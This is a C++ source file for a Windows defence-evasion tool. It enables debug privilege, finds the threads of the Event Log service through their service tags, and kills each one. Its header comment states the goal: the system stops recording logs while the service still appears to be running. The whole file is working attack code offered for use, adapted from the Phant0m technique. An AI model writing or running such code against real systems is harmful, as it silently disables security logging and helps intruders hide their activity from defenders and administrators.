/*
    WindowsEventLogBypass.cpp
    Author：3gstudent@3gstudent
    Use NtQueryInformationThread API and I_QueryTagInformation API to get service name of the thread.
    Auto kill Event Log Service Threads.
    So the system will not be able to collect logs and at the same time the Event Log Service will appear to be running.
    Learn from https://artofpwn.com/phant0m-killing-windows-event-log.html
*/

#include <windows.h>  
#include <Strsafe.h>
#include <tlhelp32.h>  

typedef enum _SC_SERVICE_TAG_QUERY_TYPE
{
    ServiceNameFromTagInformation = 1,
    ServiceNameReferencingModuleInformation,
    ServiceNameTagMappingInformation,
} SC_SERVICE_TAG_QUERY_TYPE, *PSC_SERVICE_TAG_QUERY_TYPE;
typedef struct _SC_SERVICE_TAG_QUERY
{
    ULONG   processId;
    ULONG   serviceTag;
    ULONG   reserved;
    PVOID   pBuffer;
} SC_SERVICE_TAG_QUERY, *PSC_SERVICE_TAG_QUERY;
typedef struct _CLIENT_ID
{
    DWORD       uniqueProcess;
    DWORD       uniqueThread;
} CLIENT_ID, *PCLIENT_ID;
typedef struct _THREAD_BASIC_INFORMATION
{
    NTSTATUS    exitStatus;
    PVOID       pTebBaseAddress;
    CLIENT_ID   clientId;
    long        dummy[3];
} THREAD_BASIC_INFORMATION, *PTHREAD_BASIC_INFORMATION;
typedef ULONG (WINAPI* FN_I_QueryTagInformation)(PVOID, SC_SERVICE_TAG_QUERY_TYPE, PSC_SERVICE_TAG_QUERY);
typedef NTSTATUS (WINAPI* FN_NtQueryInformationThread)(HANDLE, THREAD_INFORMATION_CLASS, PVOID, ULONG, PULONG);
typedef long NTSTATUS;

BOOL GetServiceTagString(DWORD processId, ULONG tag, PWSTR pBuffer, SIZE_T bufferSize)
{
    BOOL success = FALSE;
    HMODULE advapi32 = NULL;
    FN_I_QueryTagInformation pfnI_QueryTagInformation = NULL;
    SC_SERVICE_TAG_QUERY tagQuery = {0};
    do
    {
        advapi32 = LoadLibrary(L"advapi32.dll");
        if (advapi32 == NULL)        
            break;       
        pfnI_QueryTagInformation = (FN_I_QueryTagInformation)GetProcAddress(advapi32, "I_QueryTagInformation");
        if (pfnI_QueryTagInformation == NULL)
            break;
        tagQuery.processId = processId;
        tagQuery.serviceTag = tag;
        pfnI_QueryTagInformation(NULL, ServiceNameFromTagInformation, &tagQuery);
        if (tagQuery.pBuffer)
        {
            StringCbCopy(pBuffer, bufferSize, (PCWSTR)tagQuery.pBuffer);
            LocalFree(tagQuery.pBuffer);
            success = TRUE;
        }
    } while (FALSE);
    if (advapi32)
        FreeLibrary(advapi32);
    return success;
}

BOOL GetServiceTag(DWORD processId, DWORD threadId, PULONG pServiceTag)
{
    BOOL success = FALSE;
    NTSTATUS status = 0;
    FN_NtQueryInformationThread pfnNtQueryInformationThread = NULL;
    THREAD_BASIC_INFORMATION threadBasicInfo = {0};
    HANDLE process = NULL;
    HANDLE thread = NULL;
    HANDLE subProcessTag = NULL;
    do
    {
        pfnNtQueryInformationThread = (FN_NtQueryInformationThread)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryInformationThread");
        if (pfnNtQueryInformationThread == NULL)
            break;
        thread = OpenThread(THREAD_QUERY_LIMITED_INFORMATION, FALSE, threadId);
        if (thread == NULL)
            break;
        status = pfnNtQueryInformationThread(thread, ThreadBasicInformation, &threadBasicInfo, sizeof(threadBasicInfo), NULL);
        if (status != 0)
            break;
        process = OpenProcess(PROCESS_VM_READ, FALSE, processId);
        if (process == NULL)
            break;
        // SubProcessTag Offset : x86 = 0xf60 / x64 = 0x1720
        if (!ReadProcessMemory(process, ((PBYTE)threadBasicInfo.pTebBaseAddress + 0xf60), &subProcessTag, sizeof(subProcessTag), NULL))
            break;
        if (pServiceTag)
            *pServiceTag = (ULONG)subProcessTag;    
        success = TRUE;
    } while (FALSE);
    if (process)
        CloseHandle(process);
    if (thread)
        CloseHandle(thread);
    return success;
}

BOOL SetPrivilege()  
{  
    HANDLE hToken;   
    TOKEN_PRIVILEGES NewState;   
    LUID luidPrivilegeLUID;    
    if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)||!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luidPrivilegeLUID))   
    {   
        printf("SetPrivilege Error\n");  
        return FALSE;   
    }   
    NewState.PrivilegeCount = 1;   
    NewState.Privileges[0].Luid = luidPrivilegeLUID;   
    NewState.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;   
    if(!AdjustTokenPrivileges(hToken, FALSE, &NewState, NULL, NULL, NULL))  
    {  
        printf("AdjustTokenPrivilege Errro\n");  
        return FALSE;  
    }  
    return TRUE;  
}  

void TerminateEventlogThread(DWORD tid)
{
    HANDLE hThread = OpenThread(0x0001,FALSE,tid);
    if(TerminateThread(hThread,0)==0)
        printf("--> Error !\n");
    else
        printf("--> Success !\n");
    CloseHandle(hThread);
}

BOOL GetServiceTagName(DWORD tid)
{
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS,FALSE, tid);
    if (NULL == hThread)
    {
      	printf("OpenThread : %u Error! ErrorCode:%u\n",tid,GetLastError());
        return 0;
    }
    FN_NtQueryInformationThread fn_NtQueryInformationThread = NULL;
    HINSTANCE hNTDLL = GetModuleHandle(_T("ntdll"));  
    fn_NtQueryInformationThread = (FN_NtQueryInformationThread)GetProcAddress(hNTDLL, "NtQueryInformationThread");
    THREAD_BASIC_INFORMATION threadBasicInfo;
    LONG status = fn_NtQueryInformationThread(hThread, ThreadBasicInformation, &threadBasicInfo,sizeof(threadBasicInfo), NULL);
//	printf("process ID is %u\n",threadBasicInfo.clientId.uniqueProcess); 
//	printf("Thread ID is %u\n",threadBasicInfo.clientId.uniqueThread); 
    CloseHandle ( hThread ) ;
    DWORD pid = threadBasicInfo.clientId.uniqueProcess;
    printf("[+] Query Service Tag %u.%u\n",pid,tid);
    ULONG serviceTag = 0;
    if (GetServiceTag(pid, tid, &serviceTag) == FALSE)
    {
        return 0;
    }
    WCHAR tagString[MAX_PATH] = {0};
    if (GetServiceTagString(pid, serviceTag, tagString, sizeof(tagString)) == FALSE)
    {
        return 0;
    }
//    wprintf(L"Service Tag Name : %s\n", tagString);
    if(wcscmp(tagString,L"eventlog")==0)
    {
        printf("[!] Get eventlog thread,%d!	--> try to kill ",tid);
        TerminateEventlogThread(tid);
    }
}

BOOL ListProcessThreads(DWORD pid) 
{  
    HANDLE hThreadSnap = INVALID_HANDLE_VALUE;  
    THREADENTRY32 te32;    
    hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);  
    if (hThreadSnap == INVALID_HANDLE_VALUE)  
        return(FALSE);   
    te32.dwSize = sizeof(THREADENTRY32);  
    if (!Thread32First(hThreadSnap, &te32)) 
    { 
        printf("Thread32First");
        CloseHandle(hThreadSnap);   
        return(FALSE);  
    }  
    do 
    {  
        if (te32.th32OwnerProcessID == pid)
	{
//            printf("tid= %d\n",te32.th32ThreadID);  
		GetServiceTagName(te32.th32ThreadID);
	}
    } while (Thread32Next(hThreadSnap, &te32));  
    CloseHandle(hThreadSnap);  
    return(TRUE);  
}  
  
int _tmain(int argc, _TCHAR* argv[])
{
    SetPrivilege();
    ListProcessThreads(_ttoi(argv[1]));
    printf("------------------------------\n");
    printf("All done, you are ready to go!\n");	 
    return 0;
}
